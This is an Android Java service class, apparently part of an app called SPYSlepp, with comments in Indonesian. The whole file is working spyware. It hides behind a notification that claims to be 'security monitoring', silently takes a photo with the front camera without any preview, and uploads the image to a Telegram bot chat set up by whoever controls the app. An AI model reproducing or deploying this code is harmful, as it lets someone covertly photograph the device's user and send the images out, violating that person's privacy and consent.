package com.spye.spyslepp;

import android.app.*;
import android.content.*;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.os.*;
import android.util.Log;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;

public class SpyService extends Service {
    private static final String TAG = "SPY_DEBUG";
    private String botToken, chatId;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "SpyService: Service dijalankan.");
        createNotificationChannel();
        
        // Membangun notifikasi wajib untuk Foreground Service
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, "SPY_CH");
        } else {
            builder = new Notification.Builder(this);
        }

        Notification notification = builder
                .setContentTitle("SPYSlepp Security Active")
                .setContentText("Memantau keamanan perangkat...")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .build();
        
        startForeground(1, notification);

        // Ambil konfigurasi yang disimpan MainActivity
        SharedPreferences pref = getSharedPreferences("SpyConfig", MODE_PRIVATE);
        botToken = pref.getString("bot_token", "");
        chatId = pref.getString("chat_id", "");

        if (!botToken.isEmpty() && !chatId.isEmpty()) {
            Log.d(TAG, "SpyService: Konfigurasi ditemukan, mengambil foto...");
            takeSilentPhoto();
        } else {
            Log.e(TAG, "SpyService: Konfigurasi kosong! Service dihentikan.");
            stopSelf();
        }

        return START_NOT_STICKY;
    }

    private void takeSilentPhoto() {
        try {
            final Camera camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
            SurfaceTexture st = new SurfaceTexture(0);
            camera.setPreviewTexture(st);
            camera.startPreview();

            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    Log.d(TAG, "SpyService: Foto berhasil diambil, mencoba mengirim...");
                    sendToTelegram(data);
                    camera.release();
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "SpyService Error Kamera: " + e.getMessage());
            stopSelf();
        }
    }

    private void sendToTelegram(final byte[] photoData) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String urlString = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setDoOutput(true);
                    conn.setRequestMethod("POST");
                    
                    String boundary = "===" + System.currentTimeMillis() + "===";
                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                    OutputStream out = conn.getOutputStream();
                    PrintWriter writer = new PrintWriter(new OutputStreamWriter(out, "UTF-8"), true);

                    // Part Chat ID
                    writer.append("--" + boundary).append("\r\n");
                    writer.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n");
                    writer.append(chatId).append("\r\n");

                    // Part Photo
                    writer.append("--" + boundary).append("\r\n");
                    writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"security_capture.jpg\"").append("\r\n");
                    writer.append("Content-Type: image/jpeg").append("\r\n\r\n");
                    writer.flush();

                    out.write(photoData);
                    out.flush();
                    
                    writer.append("\r\n");
                    writer.append("--" + boundary + "--").append("\r\n");
                    writer.close();

                    int responseCode = conn.getResponseCode();
                    Log.d(TAG, "SpyService: Pengiriman selesai. Kode Respon: " + responseCode);
                    
                    stopForeground(true);
                    stopSelf();
                } catch (Exception e) {
                    Log.e(TAG, "SpyService Pengiriman Gagal: " + e.getMessage());
                    stopSelf();
                }
            }
        }).start();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    "SPY_CH", "Spy Service Channel", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(serviceChannel);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
